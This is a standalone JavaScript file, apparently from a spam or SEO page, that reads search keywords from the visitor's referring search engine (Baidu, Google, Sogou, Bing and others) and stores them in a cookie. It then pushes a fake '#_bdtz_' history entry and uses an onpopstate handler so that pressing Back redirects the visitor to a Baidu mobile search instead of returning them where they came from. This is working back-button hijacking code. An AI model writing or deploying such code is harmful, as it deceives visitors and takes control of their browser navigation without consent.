var customurl = "";
var url = document.referrer;
var keyword = "";
var localUrl = window.location.href.toString();
var sosuo = url.split(".")[1];
var grep = null;
var str = null;
var issogou = 0;
switch (sosuo) {
    case "baidu":
        if (url.indexOf("w=0_10_") != -1) {
            grep = /w=0_10_.*\//i;
            str = url.match(grep);
            keyword = str.toString().split("/")[0].split("_")[2]
        } else if (url.indexOf("&word") != -1) {
            grep = /&word\=.*/i;
            str = url.match(grep);
            keyword = str.toString().split("&")[1].split("=")[1]
        } else {
            grep = /word\=.*/i;
            str = url.match(grep);
            keyword = str.toString().split("&")[0].split("=")[1];
        }
        issogou = 1;
        break;
    case "google":
        grep = /&q\=.*\&/i;
        str = url.match(grep);
        keyword = str.toString().split("&")[1].split("=")[1];
        issogou = 1;
        break;
    case "so":
        grep = /q\=.*\&/i;
        str = url.match(grep);
        keyword = str.toString().split("&")[0].split("=")[1];
        issogou = 1;
        break;
    case "sogou":
        grep = /&keyword\=.*\&/i;
        str = url.match(grep);
        keyword = str.toString().split("&")[1].split("=")[1];
        issogou = 1;
        break;
    case "youdao":
        grep = /q\=.*\&/i;
        str = url.match(grep);
        keyword = str.toString().split("=")[1].split("&")[0];
        issogou = 1;
        break;
    case "bing":
        grep = /q\=.*\&/i;
        str = url.match(grep);
        keyword = str.toString().split("=")[1].split("&")[0];
        issogou = 1;
        break;
}

if (url.indexOf("sm.") != -1) {
    grep = /q\=.*\&/i;
    str = url.match(grep);
    keyword = str.toString().split("=")[1].split("&")[0];
    issogou = 1;
}
if (issogou == 1) {
    if (keyword != "" && keyword != "underfind" && keyword != null) {
        document.cookie = "mword=" + keyword
    } else {
        document.cookie = "mword=" + encodeURIComponent("本命佛")
    }
} else {
    document.cookie = "mword=" + encodeURIComponent("本命佛")
}
function getCookie0001(objName) {
    var arrStr = document.cookie.split("; ");
    for (var i = 0; i < arrStr.length; i++) {
        var temp = arrStr[i].split("=");
        if (temp[0] == objName) {
            return temp[1]
        }
    }
}
function GetRandomNum(Min, Max) {
    var Range = Max - Min;
    var Rand = Math.random();
    return (Min + Math.round(Rand * Range))
}
var hash = window.location.href;
if (location.hash.indexOf("_bdtz") == -1) {
    history.pushState({
            page: 1
        },
        "", hash + "#_bdtz_")
}
var bdpar = window.location.href;
var refer = document.referrer;
var bd = refer.indexOf("baidu.com");
var hs = refer.indexOf("haosou.");
var sm = refer.indexOf("sm.");
var sg = refer.indexOf("sogou.");
var wt = bdpar.indexOf("waitui");
var yh = bdpar.indexOf("youhua");
var bai = bdpar.indexOf("#baidu");
var hao = bdpar.indexOf("#360");
var shen = bdpar.indexOf("#sm");
var so = bdpar.indexOf("#so");
refer = refer.replace("?q=", "?word=");
refer = refer.replace("keyword=", "word=");
bdpar = bdpar.replace("?baidu", "#baidu");
bdpar = bdpar.replace("#", "%23");
var hash = location.hash;
if (bd != -1 || hs != -1 || sm != -1 || sg != -1 || wt != -1 || yh != -1 || bai != -1 || hao != -1 || shen != -1 || so != -1) {
    if (location.hash.indexOf("_bdtz") == -1) {
        history.pushState({
                page: 1
            },
            "bd", hash + "#_bdtz_")
    }
};
window.onpopstate = function(a) {
    if (location.hash.indexOf("_bdtz_") == -1) {
        wd00 = getCookie0001("mword");
        if (sm != -1) {
            window.location.href = "http://m.baidu.com/s?q=" + wd00
        } else {
            window.location.href = "http://m.baidu.com/s?word=" + wd00
        }
    }
};